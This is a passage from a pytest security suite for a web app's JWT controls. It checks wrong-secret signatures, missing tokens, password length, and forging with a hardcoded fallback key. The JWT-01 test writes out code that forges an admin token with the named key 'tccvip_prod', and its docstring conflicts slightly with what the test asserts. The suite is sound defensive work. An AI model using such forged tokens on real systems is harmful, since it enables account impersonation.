# JWT-03       │ SKIP (no JWT layer)    │ PASS – change-pw needs JWT
# JWT-04       │ SKIP (no JWT layer)    │ PASS – change-pw rejects short pw
# =============================================================================

class TestJWTSecurity:
    """
    Section 7: JWT-specific security controls in fixed_app.py.

    Tests in this class call _has_endpoint() on a JWT-protected endpoint.
    If verify_token() doesn't exist in the imported module (app.py), the
    tests skip automatically so the suite runs cleanly on both targets.
    """

    # -------------------------------------------------------------------------
    # JWT-01 | CWE-798 | CVSS 9.1
    # The known hardcoded fallback key allows token forging (attack guide).
    # -------------------------------------------------------------------------
    def test_forged_token_with_known_secret_is_rejected(self, client):
        """
        JWT-01 | Known Secret Key Allows Token Forging (CWE-798)

        As documented in jwt_forging_attack_guide.md, the SECRET_KEY fallback
        'tccvip_prod' is well-known.  Any actor with the source code can forge
        a JWT claiming any user_id and gain full access.

        This test forges a token for user_id=1 using the known secret and
        sends it to a JWT-protected endpoint.  If the endpoint accepts it,
        the key is confirmed guessable from source code.

        NOTE: This test CONFIRMS the attack works (returns 201) rather than
        checking it is blocked — because the key IS the real key.  The finding
        is that the key is hardcoded and guessable, not that tokens are rejected.
        The fix is to use a strong random key from the environment.
        """
        if not _has_endpoint("/api/posts"):
            pytest.skip("[JWT-01] POST /api/posts not available.")

        # Forge token using the publicly known fallback key
        forged = pyjwt.encode(
            {
                "user_id": 1,
                "username": "admin",
                "exp": datetime.now(timezone.utc) + timedelta(hours=24),
            },
            "tccvip_prod",          # the known-weak secret from source code
            algorithm="HS256",
        )

        response = client.post(
            "/api/posts",
            json={"title": "Forged post via known secret", "content": "Attack!"},
            headers=_auth_header(forged),
        )
        # If the app accepts this forged token (200/201), the known-key attack works.
        # The presence of the hardcoded fallback is the bug regardless.
        if response.status_code in (200, 201):
            pytest.fail(
                f"[JWT-01] SECURITY BUG: Token forged with the hardcoded fallback "
                f"key 'tccvip_prod' was ACCEPTED (HTTP {response.status_code}). "
                "Any actor with the source code can impersonate any user. "
                "Replace the hardcoded key with a strong random secret from env."
            )
        # If the endpoint returned 401/403, the key in use differs from the fallback
        # (env var overrides the default) — that is the expected secure state.

    # -------------------------------------------------------------------------
    # JWT-02 | CWE-347 | CVSS 9.8
    # Token forged with a different secret must be rejected.
    # -------------------------------------------------------------------------
    def test_jwt_with_wrong_secret_rejected_on_change_password(self, client):
        """
        JWT-02 | JWT Signature Verification — Wrong Secret (CWE-347)

        POST /api/change-password with a JWT signed by a key that does NOT
        match the application's SECRET_KEY must return 401.
        This tests verify_token()'s InvalidSignatureError handling.
        """
        if not _has_endpoint("/api/change-password"):
            pytest.skip(
                "[JWT-02] /api/change-password absent (app.py). Skipping."
            )

        wrong_secret_token = pyjwt.encode(
            {
                "user_id": 1,
                "username": "admin",
                "exp": datetime.now(timezone.utc) + timedelta(hours=24),
            },
            "definitely_not_the_real_secret_key_xyz",
            algorithm="HS256",
        )

        response = client.post(
            "/api/change-password",
            json={"password": "NewValidPassword1!"},
            headers=_auth_header(wrong_secret_token),
        )
        assert response.status_code == 401, (
            f"[JWT-02] SECURITY BUG: JWT signed with wrong secret was ACCEPTED "
            f"by /api/change-password (HTTP {response.status_code}). "
            "Signature verification is absent or broken."
        )

    # -------------------------------------------------------------------------
    # JWT-03 | CWE-306 | CVSS 8.8
    # /api/change-password without any token must return 401.
    # -------------------------------------------------------------------------
    def test_change_password_without_token_returns_401(self, client):
        """
        JWT-03 | Change Password Without Authentication (CWE-306)

        POST /api/change-password with no Authorization header must return 401.
        If the endpoint accepts an unauthenticated request, any actor can
        change any user's password via a CSRF attack.
        """
        if not _has_endpoint("/api/change-password"):
            pytest.skip(
                "[JWT-03] /api/change-password absent (app.py). Skipping."
            )

        response = client.post(
            "/api/change-password",
            json={"password": "NewPass123!"},
        )
        assert response.status_code == 401, (
            f"[JWT-03] SECURITY BUG: POST /api/change-password returned "
            f"HTTP {response.status_code} without a bearer token."
        )

    # -------------------------------------------------------------------------
    # JWT-04 | CWE-521 | CVSS 6.5
    # /api/change-password must enforce minimum password length.
    # -------------------------------------------------------------------------
    def test_change_password_enforces_minimum_length(self, client):
        """
        JWT-04 | Weak Password Accepted by change-password Endpoint (CWE-521)

        POST /api/change-password with a valid JWT but a password < 6 chars
        must return 400.  fixed_app.py enforces len(new_password) >= 6.
        """
        if not _has_endpoint("/api/change-password"):
            pytest.skip(
                "[JWT-04] /api/change-password absent (app.py). Skipping."
            )

        valid_token = _make_valid_jwt(user_id=1)
        response = client.post(
            "/api/change-password",
            json={"password": "abc"},       # 3 chars — below minimum
            headers=_auth_header(valid_token),
        )
        assert response.status_code == 400, (
            f"[JWT-04] SECURITY BUG: Password 'abc' (3 chars) was accepted by "
            f"/api/change-password (HTTP {response.status_code}). "
            "Minimum length not enforced on password change."
        )
